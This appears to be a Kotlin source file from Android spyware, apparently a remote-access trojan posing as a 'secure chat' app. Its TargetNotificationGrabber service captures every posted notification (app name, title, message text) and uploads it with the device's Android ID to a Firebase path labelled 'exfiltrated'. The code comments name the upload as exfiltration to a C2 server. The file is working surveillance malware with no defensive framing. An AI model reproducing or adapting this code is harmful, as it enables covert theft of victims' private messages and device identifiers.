package com.secure.chat.services

import android.app.Notification
import android.content.Context
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.secure.chat.C2Manager

class TargetNotificationGrabber : NotificationListenerService() {

    companion object {
        private const val TAG = "TargetNotif"
        var isConnected = false
            private set
        private var instance: TargetNotificationGrabber? = null
    }

    override fun onListenerConnected() {
        super.onListenerConnected()
        isConnected = true
        instance = this
        Log.d(TAG, "Notification listener connected")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        isConnected = false
        instance = null
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val extras = sbn.notification.extras
        val title = extras.getString(Notification.EXTRA_TITLE, "")
        val text = extras.getCharSequence(Notification.EXTRA_TEXT, "")?.toString() ?: ""
        val packageName = sbn.packageName

        // Exfiltrate notification
        val notifData = mapOf(
            "package" to packageName,
            "title" to title,
            "text" to text,
            "time" to sbn.postTime.toString()
        )

        Log.d(TAG, "Notif: $packageName - $title")

        // Send to C2 via exfil
        TargetC2Service().let {
            // Use direct exfil ref
            com.google.firebase.database.FirebaseDatabase.getInstance()
                .getReference("selzxratV5/exfiltrated")
                .push()
                .setValue(mapOf(
                    "type" to "notification",
                    "content" to "$packageName | $title: $text",
                    "deviceId" to (android.provider.Settings.Secure.getString(
                        contentResolver, android.provider.Settings.Secure.ANDROID_ID
                    ) ?: "unknown"),
                    "timestamp" to System.currentTimeMillis()
                ))
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {}

    fun getActiveNotifications(context: Context): List<StatusBarNotification> {
        return instance?.activeNotifications?.toList() ?: emptyList()
    }
}